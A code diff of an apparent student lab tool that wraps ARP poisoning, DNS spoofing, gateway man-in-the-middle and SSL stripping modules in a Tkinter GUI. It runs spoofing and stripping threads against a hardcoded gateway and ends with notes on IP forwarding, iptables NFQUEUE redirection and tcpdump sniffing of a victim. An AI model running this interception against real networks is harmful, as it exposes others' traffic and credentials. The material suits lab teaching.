@@ -1,14 +1,16 @@
 import arp_poison
 import dns_spoof
 import arp_mitm_gateway
-import ssl_strip
 import recon
 import os
 import sys
 import threading
-import tkinter as tk
+import ssl_strip
+import Tkinter as tk
+import time
 
 def main():
+
     os.system("clear")
     print("Hold on, Scanning Network...")
     interfaces = recon.list_interfaces()
@@ -35,42 +37,6 @@ def main():
     ipServerLAN = devicesListLAN[1]['ip']
     macServerLAN = devicesListLAN[1]['mac']
 
-    # print("Please choose an attack:")
-    # print("A. ARP Poisoning")
-    # print("B. DNS Spoofing")
-    # print("C. ARP Listener")
-    # print("D. ARP MITM")
-    # print("E. SSL Stripping")
-    # attack = raw_input("Enter your choice: ")
-    # print("\n\n\n")
-    
-    # if attack.lower() == "a":
-    #     print("ARP Poisoning...")
-    #     arp_poison.arp_poison(ipVictimLAN, macVictimLAN, ipServerLAN, macAttackerLAN, interfaceLAN)
-    # elif attack.lower() == "b":
-    #     print("DNS Spoofing...")
-    #     dns_spoof.dns_spoof()
-    # elif attack.lower() == "c":
-    #     arp_poison.arp_listener(macAttackerLAN, interfaceLAN)
-    # elif attack.lower() == "d":
-    #     arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT)
-    # elif attack.lower() == "e":
-    #     print("MITM ...")
-    #     arp_thread = threading.Thread(target=arp_mitm_gateway.spoof, args=(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT))
-    #     arp_thread.start()
-
-    #     print("SSL Stripping...")
-    #     ssl_thread = threading.Thread(target=ssl_strip.ssl_strip, args=(interfaceNAT,))
-    #     ssl_thread.start()
-
-    #     arp_thread.join()
-    #     ssl_thread.join()
-
-    # else:
-    #     print("Unknown command: {}. Use either 'A', 'B', 'C', 'D', or 'E'".format(attack))
-    #     sys.exit(1)
-
-    
     win = tk.Tk()
     win.geometry("800x600")
     win.title("Group 36 Tool")
@@ -93,22 +59,6 @@ def main():
 
     labelIPAttNAT = tk.Label(win, text="Attacker IP (M3) NAT: {}".format(ipAttackerNAT))
     labelIPAttNAT.pack()
-
-    # def notCorrect():
-    #     popup = tk.Toplevel(win)
-    #     popup.geometry("300x300")
-    #     popup.title("Change IPs")
-    #     popup.resizable(False, False)            
-
-    #     menuButton = tk.Menubutton(popup, text="Choose Machine", relief="raised")
-    #     menu = tk.Menu(menuButton, tearoff=0)
-    #     selectedIP = tk.StringVar()
-        
-    #     menu.add_checkbutton(label="IPVICTIMLAN", value=ipVictimLAN, variable=selectedIP)
-    #     print(selectedIP)
-
-    #     menuButton["menu"] = menu 
-    #     menuButton.pack()
 
     menu = tk.Menu(win)
     win.config(menu=menu)
@@ -321,16 +271,17 @@ def main():
         arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT, checked)
 
     def ssl():
-        print("MITM ...")
-        arp_thread = threading.Thread(target=arp_mitm_gateway.spoof, args=(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT))
-        arp_thread.start()
+        print("MITM Activated")
+        gatewayspoof = threading.Thread(target=arp_mitm_gateway.spoof, args=("10.0.2.12", ipAttackerNAT, ipVictimNAT, "08:00:27:0B:4D:33", macAttackerNAT, macVictimNAT, interfaceNAT))
+        print("SSL Stripping")
+        sslthread = threading.Thread(target=ssl_strip.start)
+        
+        gatewayspoof.start()
+        sslthread.start()
+        gatewayspoof.join()
+        sslthread.join()
 
-        print("SSL Stripping...")
-        ssl_thread = threading.Thread(target=ssl_strip.ssl_strip, args=(interfaceNAT,))
-        ssl_thread.start()
 
-        arp_thread.join()
-        ssl_thread.join()
 
     def exit():
         win.destroy()
@@ -361,20 +312,35 @@ if __name__ == "__main__":
 
 
 
+
+
 '''
-print("#######################################")
-# print(recon.scan_network(interfaceNAT))
-print("Target IP LAN(M1): {}".format(ipVictimLAN))
-print("Target MAC LAN(M1): {}\n".format(macVictimLAN))
-print("Gateway(Server) LAN IP (M2): {}".format(ipServerLAN))
-print("Gateway(Server) LAN MAC (M2): {}\n".format(macServerLAN))
-print("Attacker IP (M3) LAN: {}".format(ipAttackerLAN))    
-print("Attacker MAC (M3) LAN: {}\n".format(macAttackerLAN))
-print("Target IP NAT(M1): {}".format(ipVictimNAT))
-print("Target MAC NAT(M1): {}\n".format(macVictimNAT))
-print("Gateway(Server) NAT IP (M2): {}".format(ipGateway))
-print("Gateway(Server) NAT MAC (M2): {}\n".format(macGateway))
-print("Attacker IP (M3) NAT: {}".format(ipAttackerNAT))    
-print("Attacker MAC (M3) NAT: {}\n".format(macAttackerNAT))
-print("#######################################\n\n\n")
+    print(interfaceNAT) # enp0s8
+    print(interfaceLAN) # enp0s3
+
+# make sure that IP forwarding is enabled on the attacker machine (M3). 
+This can be done by modifying the system configuration using the following command:
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Before running this script, you need to set up iptables to redirect packets to the NetfilterQueue
+sudo iptables -I FORWARD -j NFQUEUE --queue-num 0 
+
+
+# ps aux | grep python
+# sudo kill -9 <pid>
+# sudo iptables --flush
+# sudo iptables -t nat --flush
+
+use tcpdump to filter traffic by port and host:
+
+sudo tcpdump -i enp0s8 -n port 80
+sudo tcpdump -i enp0s8 -n host 10.0.2.9
+sudo tcpdump -i enp0s8 -n port 80 and host 10.0.2.9
+
+
 '''
+
+
+
+
+
